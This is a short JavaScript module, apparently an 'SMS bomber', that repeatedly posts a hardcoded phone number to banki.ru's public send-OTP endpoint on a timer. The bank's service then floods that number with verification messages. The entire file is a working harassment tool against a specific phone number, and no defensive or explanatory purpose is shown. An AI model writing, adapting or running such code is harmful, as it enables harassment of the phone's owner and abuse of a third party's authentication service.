const $api = require('../http')
const FormData = require('form-data')
const axios = require('axios')

class SpamService {
	isActive = false
	ITERATIONS_COUNT = 50

	bomb () {
		this.isActive = true
		return new Promise(async (resolve, reject) => {
			try {
				let i = 0
				let formData = new FormData()
				formData.append('phone', `+79811641799`)
				formData.append('isRulesAccepted', 'true')
				formData.append('isAdAccepted', 'true')
				const headers = formData.getHeaders()

				const timerId = setInterval(async () => {
					await axios.post('https://www.banki.ru/ng/api/v1.0/public/auth/send-otp/', formData, {headers}).catch(err => console.log(err))
					i++

					if (i === this.ITERATIONS_COUNT) {
						clearInterval(timerId)
						resolve()
					}
				}, 65000)
				resolve()
			} catch (err) {
				reject(err)
			}
		})
	}

	set setIsActive (bool) {
		this.isActive = bool
	}
}

module.exports = new SpamService()
